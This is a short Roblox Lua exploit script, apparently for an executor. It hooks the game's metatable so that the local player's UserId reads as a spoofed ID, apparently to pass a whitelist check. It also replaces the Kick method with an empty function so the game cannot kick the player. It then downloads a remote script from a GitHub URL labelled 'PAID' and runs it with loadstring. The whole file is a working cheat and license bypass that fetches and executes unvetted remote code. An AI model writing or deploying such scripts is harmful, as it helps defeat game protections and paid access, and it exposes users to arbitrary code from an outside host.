local spoofedUserId = 4488667209
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local whitelistedUserId = lp.UserId

local mt = getrawmetatable(game)
setreadonly(mt, false)

local oldIndex = mt.__index
mt.__index = newcclosure(function(t, k)
    if t == lp and k == "UserId" then
        return spoofedUserId
    end
    return oldIndex(t, k)
end)

setreadonly(mt, true)

wait(1)

local lpMt = getrawmetatable(lp)
setreadonly(lpMt, false)

local oldKick = lpMt.__index
lpMt.__index = newcclosure(function(t, k)
    if k == "Kick" then
        return function() end
    end
    return oldKick(t, k)
end)

setreadonly(lpMt, true)

local function safeLoadString(url)
    local success, result = pcall(function()
        loadstring(game:HttpGet(url))()
    end)

    if not success then
        warn("Error loading script: " .. result)
    end
end

safeLoadString("https://raw.githubusercontent.com/sethbns/SLHV2-PAID/refs/heads/main/main.lua")
